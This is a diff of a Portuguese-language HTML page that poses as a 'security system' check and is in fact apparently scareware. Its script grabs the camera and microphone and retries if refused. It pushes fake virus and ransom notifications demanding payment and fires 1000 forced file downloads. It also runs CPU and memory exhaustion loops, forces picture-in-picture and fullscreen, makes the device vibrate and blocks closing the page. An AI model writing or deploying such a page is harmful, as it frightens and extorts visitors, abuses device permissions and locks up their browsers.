@@ -2,22 +2,24 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Sistema</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema de Segurança</title>
     <style>
-        html, body {
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100vw;
+            height: 100vh;
             background: #000;
             overflow: hidden;
             font-family: 'Courier New', monospace;
-            width: 100vw;
-            height: 100vh;
+            color: #0f0;
         }
-        video {
-            width: 100vw;
-            height: 100vh;
-            object-fit: cover;
-        }
+
         #start {
             position: fixed;
             top: 0;
@@ -26,13 +28,39 @@
             height: 100vh;
             background: #000;
             color: #0f0;
-            font-size: 2em;
+            font-size: 2.5em;
             display: flex;
             align-items: center;
             justify-content: center;
-            z-index: 9999;
+            z-index: 10000;
             cursor: pointer;
+            text-align: center;
+            border: 3px solid #0f0;
+            text-shadow: 0 0 10px #0f0;
         }
+
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            z-index: 1;
+        }
+
+        #userVideo {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            width: 200px;
+            height: 150px;
+            border: 3px solid #ff0000;
+            z-index: 900;
+            background: #000;
+            display: none;
+        }
+
         .terminal-text {
             position: fixed;
             bottom: 20px;
@@ -40,419 +68,668 @@
             color: #0f0;
             font-family: 'Courier New', monospace;
             font-size: 12px;
-            z-index: 850;
+            z-index: 800;
             max-height: 200px;
             overflow-y: auto;
             background: rgba(0, 0, 0, 0.9);
-            padding: 10px;
-            border: 1px solid #0f0;
+            padding: 15px;
+            border: 2px solid #0f0;
             width: 500px;
+            border-radius: 5px;
         }
-        #userVideo {
+
+        .secret-overlay {
             position: fixed;
-            top: 10px;
-            right: 10px;
-            width: 300px;
-            height: 200px;
-            border: 3px solid #ff0000;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 0, 0, 0.9);
+            color: white;
+            padding: 15px;
+            font-size: 14px;
             z-index: 950;
-            background: #000;
+            display: none;
+            border-radius: 5px;
+            font-weight: bold;
         }
+
+        .status {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: rgba(255, 0, 0, 0.9);
+            color: white;
+            padding: 15px;
+            font-size: 14px;
+            z-index: 900;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+
+        .notification-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #000;
+            color: #0f0;
+            padding: 40px;
+            border: 4px solid #f00;
+            z-index: 20000;
+            text-align: center;
+            display: none;
+            border-radius: 10px;
+            box-shadow: 0 0 30px red;
+            width: 90%;
+            max-width: 500px;
+        }
+
         .final-container {
             position: fixed;
             top: 0;
             left: 0;
             width: 100vw;
             height: 100vh;
-            z-index: 20000;
+            z-index: 15000;
             display: none;
             cursor: pointer;
+            background: #000;
         }
+
         .final-image {
             width: 100%;
             height: 100%;
             object-fit: contain;
-            background: #000;
         }
+
+        .virus-alert {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #ff0000;
+            color: white;
+            padding: 40px;
+            font-size: 2em;
+            z-index: 18000;
+            display: none;
+            text-align: center;
+            border: 5px solid yellow;
+            border-radius: 15px;
+            animation: pulse 0.5s infinite;
+            box-shadow: 0 0 50px red;
+        }
+
         .crash-element {
             position: fixed;
             font-size: 24px;
-            z-index: 99999;
+            z-index: 9999;
             pointer-events: none;
-            animation: float 3s infinite;
+            animation: float 2s infinite;
         }
-        .matrix-code {
+
+        .fake-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #333;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            border: 2px solid #ff0000;
+            z-index: 950;
+            max-width: 300px;
+            box-shadow: 0 0 20px rgba(255,0,0,0.5);
+        }
+
+        button {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            margin: 10px;
+            cursor: pointer;
+            font-size: 1.2em;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        button:hover {
+            background: #00ff00;
+            box-shadow: 0 0 15px #0f0;
+        }
+
+        button.danger {
+            background: #f00;
+            color: white;
+        }
+
+        button.danger:hover {
+            background: #ff0000;
+            box-shadow: 0 0 15px #f00;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.05); }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 1; }
+            50% { transform: translateY(-20px) rotate(180deg); opacity: 0.7; }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+
+        .matrix-rain {
             position: fixed;
             top: 0;
             left: 0;
             width: 100vw;
             height: 100vh;
             pointer-events: none;
-            z-index: 800;
-            font-family: 'Courier New', monospace;
-            color: #0f0;
-            font-size: 14px;
-        }
-        .code-char {
-            position: absolute;
-            color: #0f0;
-            animation: fall 3s linear forwards;
-            text-shadow: 0 0 8px #0f0;
-        }
-        .audio-overlay {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(255, 0, 0, 0.9);
-            color: white;
-            padding: 20px;
-            font-size: 3em;
-            z-index: 10000;
-            display: none;
-            text-align: center;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 1; }
-            50% { transform: translateY(-50px) rotate(180deg); opacity: 0.7; }
-        }
-        @keyframes fall {
-            0% { transform: translateY(-100px); opacity: 0; }
-            10% { opacity: 1; }
-            90% { opacity: 1; }
-            100% { transform: translateY(100vh); opacity: 0; }
-        }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
-            20%, 40%, 60%, 80% { transform: translateX(10px); }
+            z-index: 2;
+            opacity: 0.3;
         }
     </style>
 </head>
 <body>
-    <div id="start">🚨 INICIAR SISTEMA DE TRAVAMENTO 🚨</div>
+    <!-- TELA INICIAL -->
+    <div id="start">
+        <div>
+            🚨 SISTEMA DE SEGURANÇA 🚨<br>
+            <span style="font-size: 0.6em;">CLIQUE PARA INICIAR VERIFICAÇÃO</span>
+        </div>
+    </div>
+
+    <!-- VÍDEOS -->
     <video id="video" playsinline loop muted>
         <source src="https://alexandre7888.github.io/ontono.exe/InShot_20250705_234210151.mp4" type="video/mp4">
     </video>
-    <video id="userVideo" autoplay muted playsinline style="display: none;"></video>
+    <video id="userVideo" autoplay muted playsinline></video>
+
+    <!-- INTERFACE -->
     <div class="terminal-text" id="terminal"></div>
-    <div class="matrix-code" id="matrixCode"></div>
-    <div class="audio-overlay" id="audioOverlay">EU VEJO VOCÊ</div>
-    
-    <div class="final-container" id="finalContainer">
-        <img class="final-image" src="https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg">
+    <div class="secret-overlay" id="secretOverlay"></div>
+    <div class="status" id="status">SISTEMA PRONTO</div>
+
+    <!-- POPUPS -->
+    <div class="notification-popup" id="notificationPopup">
+        <h2>🔔 PERMISSÃO DE NOTIFICAÇÃO</h2>
+        <p><strong>Permita notificações para parar o vírus</strong></p>
+        <p style="color: #ff0000; font-size: 0.9em; margin: 15px 0;">
+            ⚠️ ATENÇÃO: Negar pode causar danos permanentes!
+        </p>
+        <button onclick="enableNotificationSpam()">✅ PERMITIR NOTIFICAÇÕES</button>
+        <br>
+        <button onclick="forceNotificationSpam()" class="danger">❌ NEGAR (RISCO ALTO)</button>
     </div>
 
-    <audio id="persistentAudio" loop>
-        <source src="https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3" type="audio/mpeg">
-    </audio>
+    <div class="final-container" id="finalContainer">
+        <img class="final-image" src="https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg" alt="Alerta Final">
+    </div>
+
+    <div class="virus-alert" id="virusAlert">
+        🚨 ALERTA DE VÍRUS CRÍTICO 🚨<br>
+        <span style="font-size: 0.7em;">SEUS DADOS ESTÃO SENDO ROUBADOS</span>
+    </div>
+
+    <!-- MATRIX RAIN -->
+    <canvas class="matrix-rain" id="matrixCanvas"></canvas>
 
     <script>
+        // ELEMENTOS PRINCIPAIS
         const start = document.getElementById("start");
         const video = document.getElementById("video");
         const userVideo = document.getElementById("userVideo");
         const terminal = document.getElementById("terminal");
-        const matrixCode = document.getElementById("matrixCode");
-        const audioOverlay = document.getElementById("audioOverlay");
+        const secretOverlay = document.getElementById("secretOverlay");
+        const status = document.getElementById("status");
+        const notificationPopup = document.getElementById("notificationPopup");
         const finalContainer = document.getElementById("finalContainer");
-        const persistentAudio = document.getElementById("persistentAudio");
+        const virusAlert = document.getElementById("virusAlert");
+        const matrixCanvas = document.getElementById("matrixCanvas");
 
-        let localStream = null;
-        let audioClips = [];
+        // VARIÁVEIS GLOBAIS
+        let notificationInterval;
+        let downloadInterval;
         let crashIntervals = [];
-        let finalPhase = false;
+        let audioClips = [];
+        let isActive = false;
+        let downloadCount = 0;
+        const totalDownloads = 1000;
 
+        // FUNÇÃO DO TERMINAL
         function updateTerminal(message) {
-            terminal.textContent += `[${new Date().toLocaleTimeString()}] ${message}\n`;
+            const timestamp = new Date().toLocaleTimeString();
+            terminal.innerHTML += `<span style="color: #0f0">[${timestamp}]</span> ${message}\n`;
             terminal.scrollTop = terminal.scrollHeight;
         }
 
-        // **SISTEMA DE ÁUDIO QUE FUNCIONA**
+        // MATRIX RAIN EFFECT
+        function setupMatrixRain() {
+            const ctx = matrixCanvas.getContext('2d');
+            matrixCanvas.width = window.innerWidth;
+            matrixCanvas.height = window.innerHeight;
+
+            const chars = "0101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&";
+            const fontSize = 14;
+            const columns = matrixCanvas.width / fontSize;
+            const drops = [];
+
+            for(let i = 0; i < columns; i++) {
+                drops[i] = 1;
+            }
+
+            function draw() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+                ctx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
+                
+                ctx.fillStyle = '#0f0';
+                ctx.font = fontSize + 'px monospace';
+
+                for(let i = 0; i < drops.length; i++) {
+                    const text = chars[Math.floor(Math.random() * chars.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if(drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+
+            setInterval(draw, 33);
+        }
+
+        // SISTEMA DE ÁUDIO
         function setupAudioSystem() {
             updateTerminal("🔊 INICIANDO SISTEMA DE ÁUDIO...");
             
-            for (let i = 0; i < 10; i++) {
+            for (let i = 0; i < 15; i++) {
                 const audio = new Audio();
                 audio.src = "https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3";
-                audio.volume = 0.8;
+                audio.volume = 0.7;
                 audio.preload = "auto";
                 audioClips.push(audio);
             }
             
-            // Tocar áudio quando usuário interage
-            const playAllAudio = () => {
-                audioClips.forEach((audio, index) => {
-                    setTimeout(() => {
-                        audio.currentTime = 0;
-                        audio.play().catch(e => {
-                            audio.muted = true;
-                            audio.play();
-                        });
-                    }, index * 400);
-                });
-                
-                audioOverlay.style.display = 'block';
-                setTimeout(() => audioOverlay.style.display = 'none', 3000);
-            };
-            
-            document.addEventListener('click', playAllAudio);
-            document.addEventListener('keydown', playAllAudio);
+            updateTerminal("✅ 15 ÁUDIOS CARREGADOS");
         }
 
-        // **EFEITO MATRIX**
-        function createMatrixEffect() {
-            const chars = "01010101010101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&";
-
-            setInterval(() => {
-                for (let i = 0; i < 8; i++) {
-                    const charElement = document.createElement('div');
-                    charElement.className = 'code-char';
-                    charElement.textContent = chars[Math.floor(Math.random() * chars.length)];
-                    charElement.style.left = Math.random() * 100 + 'vw';
-                    charElement.style.fontSize = (12 + Math.random() * 10) + 'px';
-                    charElement.style.animationDuration = (2 + Math.random() * 3) + 's';
-
-                    matrixCode.appendChild(charElement);
-
-                    setTimeout(() => {
-                        charElement.remove();
-                    }, 5000);
-                }
-            }, 100);
+        function playAllAudio() {
+            audioClips.forEach((audio, index) => {
+                setTimeout(() => {
+                    audio.currentTime = Math.random() * 5;
+                    audio.play().catch(e => {
+                        audio.muted = true;
+                        audio.play();
+                    });
+                }, index * 300);
+            });
         }
 
-        // **SISTEMA DE CÂMERA**
+        // CÂMERA DO USUÁRIO
         async function startCamera() {
             try {
                 updateTerminal("📹 INICIANDO CÂMERA...");
                 
-                const constraints = {
-                    video: {
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 },
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
                         facingMode: 'user'
                     },
                     audio: true
-                };
-
-                localStream = await navigator.mediaDevices.getUserMedia(constraints);
-                userVideo.srcObject = localStream;
+                });
+                
+                userVideo.srcObject = stream;
                 userVideo.style.display = 'block';
-                
-                updateTerminal("✅ CÂMERA ATIVA");
-                
-            } catch (error) {
-                updateTerminal("❌ CÂMERA BLOQUEADA");
-            }
-        }
-
-        // **PIP AUTOMÁTICO**
-        async function activatePIP() {
-            if (!document.pictureInPictureEnabled) {
-                updateTerminal("❌ PIP NÃO SUPORTADO");
-                return;
-            }
-
-            try {
-                await video.requestPictureInPicture();
-                updateTerminal("✅ PIP ATIVADO");
-                
-                video.addEventListener('leavepictureinpicture', () => {
-                    updateTerminal("⚠️ PIP FECHADO - REATIVANDO...");
-                    setTimeout(activatePIP, 1000);
-                });
+                updateTerminal("✅ CÂMERA ATIVA - GRAVAÇÃO INICIADA");
                 
             } catch (error) {
-                updateTerminal("❌ ERRO PIP: " + error.message);
+                updateTerminal("❌ CÂMERA BLOQUEADA - TENTANDO NOVAMENTE...");
+                setTimeout(startCamera, 5000);
             }
         }
 
-        // **TELA CHEIA**
-        function forceFullscreen() {
-            try {
-                document.documentElement.requestFullscreen();
-                updateTerminal("✅ TELA CHEIA ATIVADA");
-            } catch (e) {
-                updateTerminal("❌ TELA CHEIA BLOQUEADA");
-            }
+        // NOTIFICAÇÕES DE SPAM
+        function setupNotificationSystem() {
+            updateTerminal("🔔 CONFIGURANDO SISTEMA DE NOTIFICAÇÃO...");
+            
+            setTimeout(() => {
+                notificationPopup.style.display = 'block';
+                updateTerminal("💡 SOLICITANDO PERMISSÃO DE NOTIFICAÇÃO...");
+            }, 5000);
         }
 
-        // **VIBRAÇÃO PESADA**
-        function startHeavyVibration() {
-            if (navigator.vibrate) {
-                updateTerminal("📳 INICIANDO VIBRAÇÃO...");
-                
-                setInterval(() => {
-                    navigator.vibrate([2000, 500, 2000, 500, 2000]);
-                }, 6000);
-            } else {
-                updateTerminal("❌ VIBRAÇÃO NÃO SUPORTADA");
-            }
-        }
-
-        // **FASE FINAL**
-        function activateFinalPhase() {
-            if (finalPhase) return;
+        function enableNotificationSpam() {
+            notificationPopup.style.display = 'none';
+            updateTerminal("✅ PERMISSÃO CONCEDIDA - INICIANDO NOTIFICAÇÕES...");
             
-            finalPhase = true;
-            updateTerminal("💀 ATIVANDO FASE FINAL...");
-            
-            video.style.display = 'none';
-            userVideo.style.display = 'none';
-            finalContainer.style.display = 'block';
-            
-            if (document.pictureInPictureElement) {
-                document.exitPictureInPicture();
-            }
-            
-            forceFullscreen();
-            
-            // Tocar áudio na fase final
-            audioClips.forEach(audio => {
-                audio.play().catch(e => {
-                    audio.muted = true;
-                    audio.play();
-                });
+            Notification.requestPermission().then(permission => {
+                if (permission === 'granted') {
+                    startNotificationSpam();
+                } else {
+                    forceNotificationSpam();
+                }
             });
         }
 
-        // **TRAVAMENTO PESADO DE VERDADE**
-        function startHeavyCrash() {
-            updateTerminal("💥 INICIANDO TRAVAMENTO PESADO...");
+        function forceNotificationSpam() {
+            notificationPopup.style.display = 'none';
+            updateTerminal("🚨 MODO FORÇADO - NOTIFICAÇÕES ATIVADAS");
+            startNotificationSpam();
+        }
+
+        function startNotificationSpam() {
+            updateTerminal("🔥 NOTIFICAÇÕES DE SPAM INICIADAS!");
             
-            // PARAR INTERVALOS ANTERIORES
-            crashIntervals.forEach(interval => clearInterval(interval));
-            crashIntervals = [];
+            notificationInterval = setInterval(() => {
+                createNotification();
+            }, 10000);
+            
+            // Primeira notificação imediata
+            setTimeout(createNotification, 1000);
+        }
 
-            // 1. CPU 100% - BLOQUEIO COMPLETO
-            const cpuCrash = setInterval(() => {
-                const startTime = Date.now();
-                while (Date.now() - startTime < 5000) {
-                    for (let i = 0; i < 10000000; i++) {
-                        const a = Math.random();
-                        const b = Math.random();
-                        const result = Math.sin(a) * Math.cos(b) * Math.tan(a * b);
-                        const array = new Array(100000).fill(result);
-                        const sum = array.reduce((acc, val) => acc + val, 0);
-                    }
+        function createNotification() {
+            const messages = [
+                "🚨 VÍRUS DETECTADO! Toque para remover",
+                "📱 SEU CELULAR FOI HACKEADO!",
+                "💀 SEUS DADOS ESTÃO SENDO ROUBADOS!",
+                "📸 CÂMERA ATIVA - VOCÊ ESTÁ SENDO GRAVADO!",
+                "🔊 MICROFONE ATIVO - SUA VOZ ESTÁ SENDO GRAVADA!",
+                "💰 PAGUE R$ 500 PARA DESBLOQUEAR!",
+                "📞 LIGUE: +55 11 99999-9999",
+                "⚠️ SUAS FOTOS PESSOAIS FORAM VAZADAS!",
+                "🔐 TODAS SUAS SENHAS FORAM ROUBADAS!",
+                "🌐 SUA LOCALIZAÇÃO FOI RASTREADA!"
+            ];
+            
+            const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+            
+            if ('Notification' in window && Notification.permission === 'granted') {
+                const notification = new Notification('🚨 ALERTA CRÍTICO', {
+                    body: randomMsg,
+                    icon: 'https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg',
+                    tag: 'virus-alert',
+                    requireInteraction: true,
+                    silent: false
+                });
+                
+                notification.onclick = function() {
+                    window.open(location.href, '_blank');
+                };
+                
+            } else {
+                createFakeNotification(randomMsg);
+            }
+            
+            updateTerminal("🔔 NOTIFICAÇÃO: " + randomMsg);
+        }
+
+        function createFakeNotification(message) {
+            const fakeNotif = document.createElement('div');
+            fakeNotif.className = 'fake-notification';
+            fakeNotif.innerHTML = `<strong>🚨 ALERTA</strong><br>${message}`;
+            document.body.appendChild(fakeNotif);
+            
+            setTimeout(() => {
+                if (fakeNotif.parentNode) {
+                    fakeNotif.parentNode.removeChild(fakeNotif);
                 }
-            }, 10);
-            crashIntervals.push(cpuCrash);
+            }, 5000);
+        }
 
-            // 2. MAIS CPU
-            const cpuCrash2 = setInterval(() => {
-                let total = 0;
-                for (let i = 0; i < 50000000; i++) {
-                    total += Math.sqrt(Math.random()) * Math.log(Math.random() + 1);
-                }
-            }, 10);
-            crashIntervals.push(cpuCrash2);
+        // DOWNLOAD DE FOTOS SECRETAS
+        function generateSecretImage() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 800;
+            canvas.height = 600;
+            const ctx = canvas.getContext('2d');
+            
+            // Fundo
+            ctx.fillStyle = '#000';
+            ctx.fillRect(0, 0, 800, 600);
+            
+            // Texto
+            ctx.fillStyle = '#ff0000';
+            ctx.font = 'bold 30px Arial';
+            ctx.fillText('FOTO SECRETA COMPROMETIDA', 50, 80);
+            
+            ctx.fillStyle = '#00ff00';
+            ctx.font = '20px Courier New';
+            ctx.fillText('ARQUIVO: ' + Math.random().toString(36).substr(2, 10).toUpperCase(), 50, 130);
+            ctx.fillText('DATA: ' + new Date().toLocaleString(), 50, 160);
+            ctx.fillText('LOCALIZAÇÃO: -23.5505, -46.6333', 50, 190);
+            ctx.fillText('STATUS: ACESSO NÃO AUTORIZADO', 50, 220);
+            
+            // Códigos
+            ctx.font = '14px Courier New';
+            for (let i = 0; i < 15; i++) {
+                ctx.fillText(
+                    Math.random().toString(36).substr(2, 30).toUpperCase(),
+                    50,
+                    270 + (i * 20)
+                );
+            }
+            
+            return canvas.toDataURL('image/jpeg');
+        }
 
-            // 3. MEMÓRIA ESGOTADA
-            const memoryArrays = [];
-            const memoryCrash = setInterval(() => {
-                for (let i = 0; i < 100; i++) {
-                    memoryArrays.push(new Array(100000).fill('CRASH_' + Date.now()));
-                }
-            }, 500);
-            crashIntervals.push(memoryCrash);
+        function startMassiveDownloads() {
+            updateTerminal("📥 INICIANDO 1000 DOWNLOADS SECRETOS...");
+            secretOverlay.style.display = 'block';
+            status.textContent = "DOWNLOAD EM ANDAMENTO...";
+            
+            let completed = 0;
 
-            // 4. ELEMENTOS NA TELA
+            // 500 FOTOS SECRETAS
+            for (let i = 1; i <= 500; i++) {
+                setTimeout(() => {
+                    const imageData = generateSecretImage();
+                    
+                    fetch(imageData)
+                        .then(res => res.blob())
+                        .then(blob => {
+                            const url = URL.createObjectURL(blob);
+                            const a = document.createElement('a');
+                            a.href = url;
+                            a.download = `foto_secreta_${i}.jpg`;
+                            document.body.appendChild(a);
+                            a.click();
+                            document.body.removeChild(a);
+                            URL.revokeObjectURL(url);
+                            
+                            completed++;
+                            downloadCount++;
+                            updateDownloadProgress();
+                        });
+                        
+                }, i * 150);
+            }
+
+            // 500 ARQUIVOS SECRETOS
+            for (let i = 501; i <= 1000; i++) {
+                setTimeout(() => {
+                    const content = `
+ARQUIVO SECRETO ${i}
+====================
+DATA: ${new Date().toLocaleString()}
+CÓDIGO: ${Math.random().toString(36).substr(2, 20).toUpperCase()}
+STATUS: DADOS COMPROMETIDOS
+
+INFORMAÇÕES CAPTURADAS:
+• Fotos pessoais
+• Mensagens privadas
+• Localização GPS
+• Senhas salvas
+• Histórico de navegação
+
+CONTATO: hacker@darkweb.com
+NÃO APAGUE ESTE ARQUIVO!
+`;
+                    const blob = new Blob([content], { type: 'text/plain' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `arquivo_secreto_${i}.txt`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                    
+                    completed++;
+                    downloadCount++;
+                    updateDownloadProgress();
+                    
+                }, i * 150);
+            }
+        }
+
+        function updateDownloadProgress() {
+            secretOverlay.textContent = `📥 ${downloadCount}/1000 ARQUIVOS`;
+            
+            if (downloadCount % 100 === 0) {
+                showVirusAlert();
+                if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
+            }
+            
+            if (downloadCount === 1000) {
+                updateTerminal("🎯 DOWNLOADS CONCLUÍDOS - INICIANDO TRAVAMENTO...");
+                startHeavyCrash();
+            }
+        }
+
+        function showVirusAlert() {
+            virusAlert.style.display = 'block';
+            playAllAudio();
+            
+            setTimeout(() => {
+                virusAlert.style.display = 'none';
+            }, 3000);
+        }
+
+        // TRAVAMENTO PESADO
+        function startHeavyCrash() {
+            updateTerminal("💥 ATIVANDO MODO DE TRAVAMENTO...");
+            status.textContent = "SISTEMA COMPROMETIDO";
+            
+            // ELEMENTOS VOANDO
             const elementCrash = setInterval(() => {
-                for (let i = 0; i < 200; i++) {
+                for (let i = 0; i < 10; i++) {
                     const el = document.createElement('div');
                     el.className = 'crash-element';
                     el.style.left = Math.random() * window.innerWidth + 'px';
                     el.style.top = Math.random() * window.innerHeight + 'px';
                     el.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
-                    el.style.fontSize = (15 + Math.random() * 50) + 'px';
+                    el.style.fontSize = (20 + Math.random() * 40) + 'px';
                     el.textContent = '💀';
                     document.body.appendChild(el);
                     
-                    setTimeout(() => el.remove(), 5000);
+                    setTimeout(() => el.remove(), 3000);
                 }
-            }, 300);
-            crashIntervals.push(elementCrash);
+            }, 500);
 
-            // 5. VÍDEO TRAVADO
-            const videoCrash = setInterval(() => {
-                video.style.filter = `
-                    hue-rotate(${Math.random() * 360}deg)
-                    contrast(${100 + Math.random() * 300}%)
-                    brightness(${50 + Math.random() * 100}%)
-                `;
-                video.playbackRate = 0.1 + Math.random() * 2;
-            }, 400);
-            crashIntervals.push(videoCrash);
+            // CPU CRASH
+            const cpuCrash = setInterval(() => {
+                for (let i = 0; i < 100000; i++) {
+                    const a = Math.random();
+                    const b = Math.random();
+                    const result = Math.sin(a) * Math.cos(b) * Math.tan(a * b);
+                }
+            }, 1);
 
-            // 6. ÁUDIO TRAVADO
-            const audioCrash = setInterval(() => {
-                audioClips.forEach(audio => {
-                    audio.currentTime = Math.random() * 3;
-                    audio.playbackRate = 0.3 + Math.random() * 1.5;
-                    audio.play().catch(e => {
-                        audio.muted = true;
-                        audio.play();
-                    });
-                });
-                
-                audioOverlay.style.display = 'block';
-                setTimeout(() => audioOverlay.style.display = 'none', 2000);
-            }, 5000);
-            crashIntervals.push(audioCrash);
-
-            // 7. EFEITOS VISUAIS
+            // EFEITOS VISUAIS
             const visualCrash = setInterval(() => {
-                document.body.style.background = `hsl(${Math.random() * 360}, 100%, 8%)`;
-                document.body.style.transform = `translate(${Math.random() * 20 - 10}px, ${Math.random() * 20 - 10}px)`;
-            }, 200);
-            crashIntervals.push(visualCrash);
+                document.body.style.background = `hsl(${Math.random() * 360}, 100%, 5%)`;
+                document.body.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
+            }, 100);
 
-            updateTerminal("✅ TRAVAMENTO PESADO ATIVADO");
+            crashIntervals.push(elementCrash, cpuCrash, visualCrash);
+            
+            updateTerminal("✅ TRAVAMENTO ATIVADO - SISTEMA INUTILIZÁVEL");
         }
 
-        // **INICIAR SISTEMA COMPLETO**
-        start.addEventListener("click", async () => {
+        // PIP AUTOMÁTICO
+        async function setupPIP() {
+            if (!document.pictureInPictureEnabled) return;
+            
+            try {
+                await video.requestPictureInPicture();
+                updateTerminal("✅ PIP ATIVADO");
+                
+                video.addEventListener('leavepictureinpicture', () => {
+                    setTimeout(setupPIP, 1000);
+                });
+                
+            } catch (error) {
+                updateTerminal("❌ PIP NÃO DISPONÍVEL");
+            }
+        }
+
+        // INICIAR SISTEMA COMPLETO
+        start.addEventListener("click", async function() {
+            if (isActive) return;
+            isActive = true;
+            
             start.style.display = "none";
             updateTerminal("🚀 INICIANDO SISTEMA COMPLETO...");
-
+            
+            // CONFIGURAÇÕES INICIAIS
+            setupMatrixRain();
             setupAudioSystem();
-            createMatrixEffect();
             await startCamera();
             
+            // INICIAR VÍDEO
             video.play().catch(e => {
                 video.muted = true;
                 video.play();
             });
 
-            forceFullscreen();
-            setTimeout(activatePIP, 2000);
-            setTimeout(startHeavyVibration, 3000);
-
-            // FASE FINAL EM 20 SEGUNDOS
+            // SEQUÊNCIA DE EVENTOS
+            setTimeout(setupNotificationSystem, 3000);
+            setTimeout(setupPIP, 7000);
             setTimeout(() => {
-                activateFinalPhase();
-            }, 20000);
+                video.style.display = 'none';
+                finalContainer.style.display = 'block';
+                updateTerminal("💀 FASE FINAL - CLIQUE NA IMAGEM");
+            }, 15000);
 
-            updateTerminal("✅ SISTEMA ATIVO - FASE FINAL EM 20s");
+            updateTerminal("✅ SISTEMA INICIADO - AGUARDANDO COMANDOS...");
         });
 
-        // **CLIQUE NA FOTO = TRAVAMENTO PESADO**
-        finalContainer.addEventListener("click", () => {
-            startHeavyCrash();
+        // CLIQUE NA IMAGEM FINAL
+        finalContainer.addEventListener("click", function() {
+            finalContainer.style.display = 'none';
+            video.style.display = 'block';
+            video.play();
+            
+            updateTerminal("🔥 ATIVANDO MODO DE DESTRUIÇÃO...");
+            startMassiveDownloads();
         });
 
-        // **BLOQUEAR FECHAMENTO**
-        window.addEventListener('beforeunload', (e) => {
+        // BLOQUEAR FECHAMENTO
+        window.addEventListener('beforeunload', function(e) {
             e.preventDefault();
-            if (!finalPhase) {
-                window.open(window.location.href, '_blank');
-            }
             e.returnValue = '';
             return '';
         });
 
+        // INICIAR COM F5 TAMBÉM
+        window.addEventListener('keydown', function(e) {
+            if (e.key === 'F5') {
+                e.preventDefault();
+                location.reload();
+            }
+        });
+
+        updateTerminal("SISTEMA CARREGADO - PRONTO PARA INICIAR");
     </script>
 </body>
 </html>
